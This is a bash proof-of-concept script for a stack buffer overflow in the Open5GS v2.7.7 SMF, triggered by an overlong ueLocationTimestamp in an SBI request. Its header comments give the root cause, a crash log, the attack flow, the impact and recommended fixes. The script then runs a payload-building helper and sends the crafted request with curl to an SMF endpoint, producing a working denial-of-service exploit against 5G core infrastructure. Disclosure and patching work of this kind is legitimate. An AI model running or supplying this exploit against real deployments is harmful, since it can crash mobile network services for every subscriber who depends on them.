#!/bin/bash
# ===========================================================================
# VUL-20260604-POC: Open5GS v2.7.7 SMF Stack Buffer Overflow
#                    via ueLocationTimestamp in SBI SmContextCreateData
# ===========================================================================
#
# === Vulnerability Summary ===
#
#   Open5GS v2.7.7 SMF crashes with stack smashing (SIGABRT) when it
#   processes an SBI SmContextCreateData request containing an excessively
#   long ueLocationTimestamp string in ueLocation.nrLocation.
#
#   Root cause (lib/sbi/conv.c:907):
#     ogs_sbi_time_parse() copies the ueLocationTimestamp value into a
#     fixed-size stack buffer without validating input length.  When the
#     timestamp exceeds the buffer (e.g., 1000 bytes of 'A'), the copy
#     overflows, corrupting the stack canary.  The stack protector detects
#     the corruption and aborts:
#       *** stack smashing detected ***: terminated
#       Aborted (core dumped)
#
# === Crash Log (confirmed 2026-06-04) ===
#
#   06/04 13:43:48.998: [smf] INFO: [Added] Number of SMF-UEs is now 1
#   06/04 13:43:48.998: [smf] INFO: [Added] Number of SMF-Sessions is now 1
#   06/04 13:43:48.998: [sbi] ERROR: Cannot convert time [AAA...1000 A's]
#           (../lib/sbi/conv.c:907)
#   *** stack smashing detected ***: terminated
#   /open5gs_init.sh: line 102: 60 Aborted (core dumped) ./open5gs-smfd
#
# === Attack Flow ===
#
#   Attacker (AMF)                                     SMF (Open5GS v2.7.7)
#        |                                                   |
#        |--- HTTP POST /nsmf-pdusession/v1/sm-contexts --->|
#        |    multipart/related:                            |
#        |      Part 1: JSON SmContextCreateData            |
#        |        ueLocationTimestamp = "A" * 1000          |
#        |      Part 2: 5G NAS PDU                          |
#        |                                                  |
#        |    SMF parses JSON:                              |
#        |      -> Creates SMF-UE (OK)                      |
#        |      -> Creates SMF-Session (OK)                 |
#        |      -> ogs_sbi_time_parse(timestamp)            |
#        |         1000 bytes -> fixed stack buffer          |
#        |         OVERFLOW -> stack canary corrupted        |
#        |                                                  |
#        |    *** stack smashing detected ***               |
#        |    SIGABRT -> core dump -> SMF DOWN              |
#
# === Impact ===
#
#   - Denial of Service: single crafted request crashes entire SMF
#   - No auth required on SBI in typical deployments
#   - Potential code execution if -fstack-protector is disabled
#
# === Recommended Fix ===
#
#   1. Validate ueLocationTimestamp length in ogs_sbi_time_parse()
#   2. Reject timestamps > 64 bytes (ISO 8601 max ~27 chars)
#   3. Use safe string copy with bounds checking
#   4. Return HTTP 400 for malformed timestamps
#
# ===========================================================================

# Generate multipart body with malicious ueLocationTimestamp ("A" * 1000)
python3 body_bin_20260604.py

# Send crafted request to Open5GS SMF SBI endpoint
curl --noproxy '*' \
  --http2-prior-knowledge \
  -v \
  -X POST \
  -H 'Content-Type: multipart/related; boundary="=-l6HJGqWGrOZyBNBbt/WW9g=="' \
  -H 'Accept: application/json, multipart/related' \
  --data-binary @body.bin \
  http://172.22.0.7:7777/nsmf-pdusession/v1/sm-contexts